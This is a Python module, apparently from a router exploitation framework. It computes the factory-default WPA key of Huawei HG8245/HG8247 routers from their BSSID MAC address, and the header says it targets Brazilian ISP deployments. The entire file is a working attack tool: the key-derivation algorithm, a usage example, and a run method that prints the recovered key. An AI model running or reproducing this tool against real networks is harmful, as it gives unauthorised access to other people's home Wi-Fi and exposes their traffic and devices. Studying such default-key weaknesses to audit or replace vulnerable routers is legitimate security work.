"""Huawei HG8245/HG8247 WPA default key generator from BSSID MAC address.

Algorithm ported from routerpwn.com HG824x() JavaScript function.
Derives the 5-character WPA key from the last 3 octets of the BSSID.

Affected: Huawei HG8245, HG8247 (Brazilian ISP deployments)
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
from embedxpl.core.exploit import *


class Exploit(Exploit):
    """Huawei HG8245/HG8247 Default WPA Key Generator.

    Generates the 5-character factory-default WPA key for Huawei HG8245
    and HG8247 ONTs/routers using the BSSID MAC address as input.

    Algorithm:
        key_chars = "0123456789abcdefghijklmnopqrstuvwxyz"
        last3 = int(bssid[-6:], 16)  # last 3 bytes
        key[i] = key_chars[(last3 >> (i * 4)) & 0xF + (last3 >> 20) & 0xF] mod 36
        ... (5 chars, indices 0..4)

    Usage:
        set target 00:11:22:AA:BB:CC
        run

    Author: Andre Henrique (@mrhenrike) | Uniao Geek
    """

    __info__ = {
        "name": "Huawei HG8245/HG8247 Default WPA Key Generator",
        "description": (
            "Generates the factory-default 5-character WPA key for Huawei "
            "HG8245 and HG8247 ONTs/routers from the BSSID MAC address. "
            "Widely deployed by Brazilian ISPs (Vivo, NET, Claro, OI)."
        ),
        "authors": (
            "routerpwn.com",
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "http://www.routerpwn.com/",
        ),
        "devices": (
            "Huawei HG8245",
            "Huawei HG8247",
            "Huawei HG8245H",
            "Huawei HG8245Q",
            "Huawei HG8247H",
        ),
    }

    target = OptMAC("", "BSSID MAC address (XX:XX:XX:XX:XX:XX or XXXXXXXXXXXX)")

    _CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz"

    def run(self) -> None:
        """Generate and print the default WPA key."""
        mac = self.target
        if not mac:
            print_error("Set target to the BSSID MAC address first")
            return

        key = self._generate_key(mac)
        if key:
            print_success(f"Default WPA key generated: {key}")
            print_table(
                ("BSSID", "Default WPA Key"),
                (mac, key),
            )
        else:
            print_error("Failed to generate key - check MAC address format")

    def check(self) -> bool:
        """Validate that the MAC address is set and parseable."""
        mac = self.target
        if not mac:
            return False
        normalized = mac.replace(":", "").replace("-", "").upper()
        return len(normalized) == 12 and all(c in "0123456789ABCDEF" for c in normalized)

    def _generate_key(self, mac: str) -> str | None:
        """Derive the WPA key from the BSSID MAC address.

        Args:
            mac: BSSID in XX:XX:XX:XX:XX:XX or XXXXXXXXXXXX format.

        Returns:
            5-character WPA key string or None on parse failure.
        """
        normalized = mac.replace(":", "").replace("-", "").upper()
        if len(normalized) != 12:
            return None

        try:
            last3 = int(normalized[6:], 16)
        except ValueError:
            return None

        base = (last3 >> 20) & 0xF
        key_chars = []
        for i in range(5):
            idx = (((last3 >> (i * 4)) & 0xF) + base) % len(self._CHARSET)
            key_chars.append(self._CHARSET[idx])

        return "".join(key_chars)
